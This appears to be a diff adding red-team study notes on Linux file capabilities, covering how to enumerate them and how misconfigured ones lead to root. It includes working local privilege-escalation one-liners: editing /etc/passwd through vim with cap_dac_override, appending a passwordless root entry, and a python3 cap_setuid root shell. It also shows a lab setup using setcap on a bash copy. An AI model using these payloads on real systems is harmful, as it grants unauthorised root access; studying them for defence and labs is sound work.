@@ -1,0 +1,185 @@
+🔍 Summary: What Are Linux Capabilities?
+Linux capabilities break down the traditional all-or-nothing root privilege model into finer, manageable permissions that can be granted per binary. This allows a non-root process to execute specific privileged actions without full root access. Capabilities are stored as metadata on executables.
+
+🚩 Why They're Dangerous
+Poorly set capabilities on binaries (especially ones like vim, python, tar, etc.) let a low-privileged user do dangerous things:
+
+Read/write root-only files
+
+Bypass file permissions
+
+Spawn shells
+
+Mount devices
+
+Access raw network functions
+
+Inject code into other processes
+
+⚙️ Key Capability Categories & What They Let You Do
+Capability	What It Lets You Do (Red Team Impact)
+cap_dac_override	Read/write any file (ignores file permissions)
+cap_sys_admin	Mount/unmount, chroot, perform many root-like actions
+cap_setuid	Change your UID (e.g., become root if binary has cap_setuid)
+cap_net_bind_service	Bind to privileged ports (<1024), potentially spoof services
+cap_sys_ptrace	Attach to other processes – steal creds or dump memory
+cap_sys_chroot	Chroot into new directories, potential escape or privilege bypass
+cap_sys_module	Load kernel modules (can go full root if misused)
+📌 How to Enumerate Capabilities on a System
+Find binaries with capabilities set:
+bash
+Copy
+Edit
+find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \; 2>/dev/null
+Sample Output:
+
+bash
+Copy
+Edit
+/usr/bin/vim.basic cap_dac_override=eip
+/usr/bin/ping cap_net_raw=ep
+Check a specific binary:
+bash
+Copy
+Edit
+getcap /usr/bin/vim.basic
+🔐 Capability Flags Cheat Sheet
+Flag	Meaning
++e	Effective – actively usable during execution
++p	Permitted – allowed to be used, but not by default
++i	Inheritable – passed to subprocesses
++ep	Most common: allowed and active
++eip	Dangerous: allowed, active, and inherited
+💣 Exploitation Example: cap_dac_override on Vim
+Abuse path: Modify /etc/passwd to remove root password
+
+bash
+Copy
+Edit
+/usr/bin/vim.basic /etc/passwd
+Non-interactive one-liner:
+
+bash
+Copy
+Edit
+echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
+Then escalate:
+
+bash
+Copy
+Edit
+su
+# now root, no password prompt
+🧠 "Got This, Do That" – Capabilities Exploitation Flow
+🔎 Got This:
+getcap reveals a binary with dangerous caps (e.g., cap_dac_override, cap_sys_admin, cap_setuid)
+
+👉 Do That:
+Capability	Exploit Path
+cap_dac_override	Modify /etc/passwd, read /etc/shadow, inject keys, etc.
+cap_sys_admin	Mount filesystems, use losetup, mount, escape chroot
+cap_setuid	Use binaries like python or custom ones to set UID to 0
+cap_sys_ptrace	Attach to sensitive processes (sshd, etc.), dump creds
+cap_sys_module	Inject a malicious kernel module (usually needs dev access)
+🛠 One-Liner Payloads
+🔸 Check your effective capabilities:
+bash
+Copy
+Edit
+capsh --print
+🔸 Exploit writable /etc/passwd:
+bash
+Copy
+Edit
+echo 'root::0:0:root:/root:/bin/bash' >> /etc/passwd
+su
+🔸 Check if a binary can escalate:
+bash
+Copy
+Edit
+getcap /usr/bin/python3
+🔸 Use Python3 to set UID and spawn shell (with cap_setuid):
+bash
+Copy
+Edit
+/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+📚 Pro Tip: GTFOBins Cap Section
+If a binary like tar, vim, python, tcpdump, or perl has capabilities set — check it on: 📦 https://gtfobins.github.io
+
+Example:
+
+bash
+Copy
+Edit
+getcap /usr/bin/tar
+# If set, GTFOBins shows how to escalate using that tar version
+🧪 Bonus: Custom Setcap for Labbing
+Want to simulate this in your lab?
+
+bash
+Copy
+Edit
+sudo cp /bin/bash /tmp/bash
+sudo setcap cap_setuid+ep /tmp/bash
+Now escalate:
+
+bash
+Copy
+Edit
+/tmp/bash -p
+
+
+🔍 Step 1: Enumerate Capabilities
+This one-liner is your go-to command:
+
+bash
+Copy
+Edit
+find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \; 2>/dev/null
+This searches common binary paths for any file with capabilities set and shows you which ones, like:
+
+bash
+Copy
+Edit
+/usr/bin/vim.basic cap_dac_override=eip
+/usr/bin/python3.8 cap_setuid=ep
+/usr/bin/ping cap_net_raw=ep
+You can also add /snap/bin, /opt, or anything custom depending on the environment.
+
+📌 Step 2: Review What the Capabilities Mean
+Once you find a binary with capabilities, check the capability meaning:
+
+Use the GTFOBins capabilities list
+
+Or your cheat sheet from earlier (e.g., cap_dac_override = read/write any file, ignore permissions)
+
+🔬 Step 3: Validate Exploitability
+Ask:
+
+Is it a common binary like vim, python, tar, perl, bash, etc.?
+
+Is the capability dangerous (e.g., cap_dac_override, cap_setuid, cap_sys_admin)?
+
+Can it be leveraged to:
+
+Modify critical files (/etc/passwd, /etc/shadow)
+
+Spawn a shell (/bin/bash -p)
+
+Change UID or spawn child processes with root rights?
+
+⚔️ Step 4: Exploit It
+Some fast paths:
+
+Capability	Payload
+cap_dac_override	vim.basic /etc/passwd → remove x from root line → su to root
+cap_setuid	/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+cap_sys_admin	Mount raw disk or chroot into root-owned directories
+cap_net_bind_service	Run rogue services or bind listeners on ports <1024
+🧠 Pro Tip:
+Chain getcap with a grep to filter for juicy stuff:
+
+bash
+Copy
+Edit
+find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \; 2>/dev/null | grep -E 'cap_dac|cap_setuid|cap_sys_admin'
